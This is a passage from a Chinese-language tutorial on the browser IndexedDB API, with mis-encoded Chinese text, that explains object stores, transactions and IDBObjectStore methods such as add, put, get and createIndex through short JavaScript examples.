</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>keyPath</code>å±æ€§è¡¨ç¤ºä¸»é”®ï¼ˆç”±äºä¸»é”®çš„å€¼ä¸èƒ½é‡å¤ï¼Œæ‰€ä»¥ä¸Šä¾‹å­˜å…¥ä¹‹å‰ï¼Œå¿…é¡»ä¿è¯æ•°æ®çš„<code>email</code>å±æ€§å€¼éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼‰ï¼Œé»˜è®¤å€¼ä¸º<code>null</code>ï¼›<code>autoIncrement</code>å±æ€§è¡¨ç¤ºï¼Œæ˜¯å¦ä½¿ç”¨è‡ªåŠ¨é€’å¢çš„æ•´æ•°ä½œä¸ºä¸»é”®ï¼ˆç¬¬ä¸€ä¸ªæ•°æ®è®°å½•ä¸º1ï¼Œç¬¬äºŒä¸ªæ•°æ®è®°å½•ä¸º2ï¼Œä»¥æ­¤ç±»æ¨ï¼‰ï¼Œé»˜è®¤ä¸º<code>false</code>ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œ<code>keyPath</code>å’Œ<code>autoIncrement</code>å±æ€§åªè¦ä½¿ç”¨ä¸€ä¸ªå°±å¤Ÿäº†ï¼Œå¦‚æœä¸¤ä¸ªåŒæ—¶ä½¿ç”¨ï¼Œè¡¨ç¤ºä¸»é”®ä¸ºé€’å¢çš„æ•´æ•°ï¼Œä¸”å¯¹è±¡ä¸å¾—ç¼ºå°‘<code>keyPath</code>æŒ‡å®šçš„å±æ€§ã€‚</p> <p>ä¸‹é¢æ˜¯<code>deleteObjectStore()</code>æ–¹æ³•çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> dbName <span class="token operator">=</span> <span class="token string">'sampleDB'</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> dbVersion <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> request <span class="token operator">=</span> indexedDB<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>dbName<span class="token punctuation">,</span> dbVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>

request<span class="token punctuation">.</span><span class="token function-variable function">onupgradeneeded</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> db <span class="token operator">=</span> request<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>oldVersion <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'store1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>oldVersion <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    db<span class="token punctuation">.</span><span class="token function">deleteObjectStore</span><span class="token punctuation">(</span><span class="token string">'store1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'store2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>ä¸‹é¢æ˜¯<code>transaction()</code>æ–¹æ³•çš„ä¾‹å­ï¼Œè¯¥æ–¹æ³•ç”¨äºåˆ›å»ºä¸€ä¸ªæ•°æ®åº“äº‹åŠ¡ï¼Œè¿”å›ä¸€ä¸ª IDBTransaction å¯¹è±¡ã€‚å‘æ•°æ®åº“æ·»åŠ æ•°æ®ä¹‹å‰ï¼Œå¿…é¡»å…ˆåˆ›å»ºæ•°æ®åº“äº‹åŠ¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> t <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><code>transaction()</code>æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‡Œé¢æ˜¯æ‰€æ¶‰åŠçš„å¯¹è±¡ä»“åº“ï¼Œé€šå¸¸æ˜¯åªæœ‰ä¸€ä¸ªï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªè¡¨ç¤ºæ“ä½œç±»å‹çš„å­—ç¬¦ä¸²ã€‚ç›®å‰ï¼Œæ“ä½œç±»å‹åªæœ‰ä¸¤ç§ï¼š<code>readonly</code>ï¼ˆåªè¯»ï¼‰å’Œ<code>readwrite</code>ï¼ˆè¯»å†™ï¼‰ã€‚æ·»åŠ æ•°æ®ä½¿ç”¨<code>readwrite</code>ï¼Œè¯»å–æ•°æ®ä½¿ç”¨<code>readonly</code>ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œçœç•¥æ—¶é»˜è®¤ä¸º<code>readonly</code>æ¨¡å¼ã€‚</p> <h2 id="_7-idbobjectstore-å¯¹è±¡"><a href="#_7-idbobjectstore-å¯¹è±¡" class="header-anchor">#</a> 7.IDBObjectStore å¯¹è±¡</h2> <p>IDBObjectStore å¯¹è±¡å¯¹åº”ä¸€ä¸ªå¯¹è±¡ä»“åº“ï¼ˆobject storeï¼‰ã€‚<code>IDBDatabase.createObjectStore()</code>æ–¹æ³•è¿”å›çš„å°±æ˜¯ä¸€ä¸ª IDBObjectStore å¯¹è±¡ã€‚</p> <p>IDBDatabase å¯¹è±¡çš„<code>transaction()</code>è¿”å›ä¸€ä¸ªäº‹åŠ¡å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„<code>objectStore()</code>æ–¹æ³•è¿”å› IDBObjectStore å¯¹è±¡ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨ä¸‹é¢çš„é“¾å¼å†™æ³•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readonly'</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token constant">X</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="å±æ€§-3"><a href="#å±æ€§-3" class="header-anchor">#</a> å±æ€§</h3> <p>IDBObjectStore å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ã€‚</p> <ul><li><code>IDBObjectStore.indexNames</code>ï¼šè¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼ˆDOMStringListï¼‰ï¼ŒåŒ…å«äº†å½“å‰å¯¹è±¡ä»“åº“çš„æ‰€æœ‰ç´¢å¼•ã€‚</li> <li><code>IDBObjectStore.keyPath</code>ï¼šè¿”å›å½“å‰å¯¹è±¡ä»“åº“çš„ä¸»é”®ã€‚</li> <li><code>IDBObjectStore.name</code>ï¼šè¿”å›å½“å‰å¯¹è±¡ä»“åº“çš„åç§°ã€‚</li> <li><code>IDBObjectStore.transaction</code>ï¼šè¿”å›å½“å‰å¯¹è±¡ä»“åº“æ‰€å±çš„äº‹åŠ¡å¯¹è±¡ã€‚</li> <li><code>IDBObjectStore.autoIncrement</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºä¸»é”®æ˜¯å¦ä¼šè‡ªåŠ¨é€’å¢ã€‚</li></ul> <h3 id="æ–¹æ³•-3"><a href="#æ–¹æ³•-3" class="header-anchor">#</a> æ–¹æ³•</h3> <p>IDBObjectStore å¯¹è±¡æœ‰ä»¥ä¸‹æ–¹æ³•ã€‚</p> <p><strong>ï¼ˆ1ï¼‰IDBObjectStore.add()</strong></p> <p><code>IDBObjectStore.add()</code>ç”¨äºå‘å¯¹è±¡ä»“åº“æ·»åŠ æ•°æ®ï¼Œè¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚è¯¥æ–¹æ³•åªç”¨äºæ·»åŠ æ•°æ®ï¼Œå¦‚æœä¸»é”®ç›¸åŒä¼šæŠ¥é”™ï¼Œå› æ­¤æ›´æ–°æ•°æ®å¿…é¡»ä½¿ç”¨<code>put()</code>æ–¹æ³•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>objectStore<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> key<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¯¥æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é”®å€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸»é”®ï¼Œè¯¥å‚æ•°å¯é€‰ï¼Œå¦‚æœçœç•¥é»˜è®¤ä¸º<code>null</code>ã€‚</p> <p>åˆ›å»ºäº‹åŠ¡ä»¥åï¼Œå°±å¯ä»¥è·å–å¯¹è±¡ä»“åº“ï¼Œç„¶åä½¿ç”¨<code>add()</code>æ–¹æ³•å¾€é‡Œé¢æ·»åŠ æ•°æ®äº†ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> db<span class="token punctuation">;</span>
<span class="token keyword">var</span> DBOpenRequest <span class="token operator">=</span> window<span class="token punctuation">.</span>indexedDB<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

DBOpenRequest<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  db <span class="token operator">=</span> DBOpenRequest<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">var</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  transaction<span class="token punctuation">.</span><span class="token function-variable function">oncomplete</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'transaction success'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  transaction<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'transaction error: '</span> <span class="token operator">+</span> transaction<span class="token punctuation">.</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword">var</span> objectStore <span class="token operator">=</span> transaction<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'items'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> objectStoreRequest <span class="token operator">=</span> objectStore<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span> foo<span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  objectStoreRequest<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'add data success'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p><strong>ï¼ˆ2ï¼‰IDBObjectStore.put()</strong></p> <p><code>IDBObjectStore.put()</code>æ–¹æ³•ç”¨äºæ›´æ–°æŸä¸ªä¸»é”®å¯¹åº”çš„æ•°æ®è®°å½•ï¼Œå¦‚æœå¯¹åº”çš„é”®å€¼ä¸å­˜åœ¨ï¼Œåˆ™æ’å…¥ä¸€æ¡æ–°çš„è®°å½•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>objectStore<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> key<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¯¥æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–°æ•°æ®ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸»é”®ï¼Œè¯¥å‚æ•°å¯é€‰ï¼Œä¸”åªåœ¨è‡ªåŠ¨é€’å¢æ—¶æ‰æœ‰å¿…è¦æä¾›ï¼Œå› ä¸ºé‚£æ—¶ä¸»é”®ä¸åŒ…å«åœ¨æ•°æ®å€¼é‡Œé¢ã€‚</p> <p><strong>ï¼ˆ3ï¼‰IDBObjectStore.clear()</strong></p> <p><code>IDBObjectStore.clear()</code>åˆ é™¤å½“å‰å¯¹è±¡ä»“åº“çš„æ‰€æœ‰è®°å½•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>objectStore<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¯¥æ–¹æ³•ä¸éœ€è¦å‚æ•°ã€‚</p> <p><strong>ï¼ˆ4ï¼‰IDBObjectStore.delete()</strong></p> <p><code>IDBObjectStore.delete()</code>æ–¹æ³•ç”¨äºåˆ é™¤æŒ‡å®šä¸»é”®çš„è®°å½•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>objectStore<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>Key<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¯¥æ–¹æ³•çš„å‚æ•°ä¸ºä¸»é”®çš„å€¼ã€‚</p> <p><strong>ï¼ˆ5ï¼‰IDBObjectStore.count()</strong></p> <p><code>IDBObjectStore.count()</code>æ–¹æ³•ç”¨äºè®¡ç®—è®°å½•çš„æ•°é‡ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>IDBObjectStore<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸å¸¦å‚æ•°æ—¶ï¼Œè¯¥æ–¹æ³•è¿”å›å½“å‰å¯¹è±¡ä»“åº“çš„æ‰€æœ‰è®°å½•æ•°é‡ã€‚å¦‚æœä¸»é”®æˆ– IDBKeyRange å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œåˆ™è¿”å›å¯¹åº”çš„è®°å½•æ•°é‡ã€‚</p> <p><strong>ï¼ˆ6ï¼‰IDBObjectStore.getKey()</strong></p> <p><code>IDBObjectStore.getKey()</code>ç”¨äºè·å–ä¸»é”®ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>objectStore<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¯¥æ–¹æ³•çš„å‚æ•°å¯ä»¥æ˜¯ä¸»é”®å€¼æˆ– IDBKeyRange å¯¹è±¡ã€‚</p> <p><strong>ï¼ˆ7ï¼‰IDBObjectStore.get()</strong></p> <p><code>IDBObjectStore.get()</code>ç”¨äºè·å–ä¸»é”®å¯¹åº”çš„æ•°æ®è®°å½•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>objectStore<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><strong>ï¼ˆ8ï¼‰IDBObjectStore.getAll()</strong></p> <p><code>DBObjectStore.getAll()</code>ç”¨äºè·å–å¯¹è±¡ä»“åº“çš„è®°å½•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// è·å–æ‰€æœ‰è®°å½•</span>
objectStore<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">// è·å–æ‰€æœ‰ç¬¦åˆæŒ‡å®šä¸»é”®æˆ– IDBKeyRange çš„è®°å½•</span>
objectStore<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span>

<span class="token comment">// æŒ‡å®šè·å–è®°å½•çš„æ•°é‡</span>
objectStore<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> count<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><strong>ï¼ˆ9ï¼‰IDBObjectStore.getAllKeys()</strong></p> <p><code>IDBObjectStore.getAllKeys()</code>ç”¨äºè·å–æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ä¸»é”®ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// è·å–æ‰€æœ‰è®°å½•çš„ä¸»é”®</span>
objectStore<span class="token punctuation">.</span><span class="token function">getAllKeys</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">// è·å–æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ä¸»é”®</span>
objectStore<span class="token punctuation">.</span><span class="token function">getAllKeys</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span>

<span class="token comment">// æŒ‡å®šè·å–ä¸»é”®çš„æ•°é‡</span>
objectStore<span class="token punctuation">.</span><span class="token function">getAllKeys</span><span class="token punctuation">(</span>query<span class="token punctuation">,</span> count<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><strong>ï¼ˆ10ï¼‰IDBObjectStore.index()</strong></p> <p><code>IDBObjectStore.index()</code>æ–¹æ³•è¿”å›æŒ‡å®šåç§°çš„ç´¢å¼•å¯¹è±¡ IDBIndexã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>objectStore<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æœ‰äº†ç´¢å¼•ä»¥åï¼Œå°±å¯ä»¥é’ˆå¯¹ç´¢å¼•æ‰€åœ¨çš„å±æ€§è¯»å–æ•°æ®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> t <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'people'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readonly'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> store <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'people'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> index <span class="token operator">=</span> store<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> request <span class="token operator">=</span> index<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>ä¸Šé¢ä»£ç æ‰“å¼€å¯¹è±¡ä»“åº“ä»¥åï¼Œå…ˆç”¨<code>index()</code>æ–¹æ³•æŒ‡å®šè·å–<code>name</code>å±æ€§çš„ç´¢å¼•ï¼Œç„¶åç”¨<code>get()</code>æ–¹æ³•è¯»å–æŸä¸ª<code>name</code>å±æ€§(<code>foo</code>)å¯¹åº”çš„æ•°æ®ã€‚å¦‚æœ<code>name</code>å±æ€§ä¸æ˜¯å¯¹åº”å”¯ä¸€å€¼ï¼Œè¿™æ—¶<code>get()</code>æ–¹æ³•æœ‰å¯èƒ½å–å›å¤šä¸ªæ•°æ®å¯¹è±¡ã€‚å¦å¤–ï¼Œ<code>get()</code>æ˜¯å¼‚æ­¥æ–¹æ³•ï¼Œè¯»å–æˆåŠŸä»¥åï¼Œåªèƒ½åœ¨<code>success</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ä¸­å¤„ç†æ•°æ®ã€‚</p> <p><strong>ï¼ˆ11ï¼‰IDBObjectStore.createIndex()</strong></p> <p><code>IDBObjectStore.createIndex()</code>æ–¹æ³•ç”¨äºæ–°å»ºå½“å‰æ•°æ®åº“çš„ä¸€ä¸ªç´¢å¼•ã€‚è¯¥æ–¹æ³•åªèƒ½åœ¨<code>VersionChange</code>ç›‘å¬å‡½æ•°é‡Œé¢è°ƒç”¨ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>objectStore<span class="token punctuation">.</span><span class="token function">createIndex</span><span class="token punctuation">(</span>indexName<span class="token punctuation">,</span> keyPath<span class="token punctuation">,</span> objectParameters<span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¯¥æ–¹æ³•å¯ä»¥æ¥å—ä¸‰ä¸ªå‚æ•°ã€‚</p> <ul><li>indexNameï¼šç´¢å¼•å</li> <li>keyPathï¼šä¸»é”®</li> <li>objectParametersï¼šé…ç½®å¯¹è±¡ï¼ˆå¯é€‰ï¼‰</li></ul> <p>ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥é…ç½®ä»¥ä¸‹å±æ€§ã€‚</p> <ul><li>uniqueï¼šå¦‚æœè®¾ä¸º<code>true</code>ï¼Œå°†ä¸å…è®¸é‡å¤çš„å€¼</li> <li>multiEntryï¼šå¦‚æœè®¾ä¸º<code>true</code>ï¼Œå¯¹äºæœ‰å¤šä¸ªå€¼çš„ä¸»é”®æ•°ç»„ï¼Œæ¯ä¸ªå€¼å°†åœ¨ç´¢å¼•é‡Œé¢æ–°å»ºä¸€ä¸ªæ¡ç›®ï¼Œå¦åˆ™ä¸»é”®æ•°ç»„å¯¹åº”ä¸€ä¸ªæ¡ç›®ã€‚</li></ul> <p>å‡å®šå¯¹è±¡ä»“åº“ä¸­çš„æ•°æ®è®°å½•éƒ½æ˜¯å¦‚ä¸‹çš„<code>person</code>ç±»å‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> person <span class="token operator">=</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> name<span class="token punctuation">,</span>
  email<span class="token operator">:</span> email<span class="token punctuation">,</span>
  created<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>å¯ä»¥æŒ‡å®šè¿™ä¸ªå¯¹è±¡çš„æŸä¸ªå±æ€§æ¥å»ºç«‹ç´¢å¼•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> store <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'people'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> autoIncrement<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

store<span class="token punctuation">.</span><span class="token function">createIndex</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> unique<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
store<span class="token punctuation">.</span><span class="token function">createIndex</span><span class="token punctuation">(</span><span class="token string">'email'</span><span class="token punctuation">,</span> <span class="token string">'email'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> unique<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

